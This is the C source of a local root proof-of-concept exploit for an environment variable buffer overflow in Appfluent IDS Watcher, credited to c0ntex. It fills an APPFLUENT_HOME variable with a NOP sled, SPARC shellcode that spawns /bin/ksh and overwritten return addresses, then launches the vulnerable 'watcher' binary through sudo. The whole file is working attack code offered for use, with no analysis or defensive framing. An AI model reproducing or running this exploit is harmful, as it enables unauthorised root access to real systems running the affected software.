  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>

  #define DAHBUF 591
  #define NOP 0x90
  #define SUDO "/usr/local/bin/sudo"
  #define VULN "watcher"
  #define WOPT "-sc"

  char shellcode[] =
"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20"
                    
"\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14"
                     "\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh";

  char retloc[] = "\xff\xbe\xfd\xe9";
  char retlok[] = "\xff\xbe\xfd\xed";

  int main()
  {
        char env[DAHBUF+9];

        puts("\nLocal root proof of concept for Appfluent IDS Watcher
environment overflow");
        puts("found and developed by c0ntex || c0ntexbgmail.com ||
www.open-security.org\n");

        memset(env, NOP, DAHBUF);

        memcpy(env + 100, shellcode, strlen(shellcode));
        memcpy(env + DAHBUF, retloc, strlen(retloc));
        memcpy(env + DAHBUF + 4, retlok, strlen(retlok));
        env[DAHBUF+9] = '\0';

        strncpy(&env[0], "APPFLUENT_HOME=", 15);

        if(!env) {
             puts("barfed!");
             return(EXIT_FAILURE);
        }

        putenv(env);

        if(execl(SUDO, SUDO, VULN, WOPT, NULL) < 0) {
             perror("execle");
             return(EXIT_FAILURE);
        }

        return(EXIT_SUCCESS);
  } 
